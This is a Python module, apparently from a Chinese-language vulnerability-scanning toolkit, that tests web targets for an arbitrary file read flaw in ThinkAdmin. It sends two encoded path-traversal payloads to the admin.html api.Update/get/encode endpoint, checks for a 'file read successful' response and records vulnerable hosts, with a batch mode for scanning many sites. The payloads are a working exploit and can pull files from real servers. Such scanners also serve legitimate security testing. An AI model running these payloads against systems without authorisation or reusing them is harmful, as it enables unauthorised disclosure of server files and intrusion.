##! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()

class ThinkAdmin_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "读取文件成功" in req.text:
                OutPrintInfoSuc("ThinkAdmin", f'目标存在ThinkAdmin任意文件读取漏洞: {url}')
                if self.batch:
                    OutPutFile("thinkadmin_file_read.txt",f'目标存在ThinkAdmin任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", f'目标不存在ThinkAdmin任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ThinkAdmin",'目标请求出错')
            return False
    def get_url2(self,input_url):
        try:
            url = input_url + "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "读取文件成功" in req.text:
                OutPrintInfoSuc("ThinkAdmin", f'目标存在ThinkAdmin任意文件读取漏洞: {url}')
                if self.batch:
                    OutPutFile("thinkadmin_file_read.txt",f'目标存在ThinkAdmin任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", f'目标不存在ThinkAdmin任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ThinkAdmin",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("ThinkAdmin", '开始检测ThinkAdmin任意文件读取漏洞...')
        self.get_url(url)
        self.get_url2(url)
        if not self.batch:
            OutPrintInfo("ThinkAdmin", 'ThinkAdmin任意文件读取漏洞检测结束')

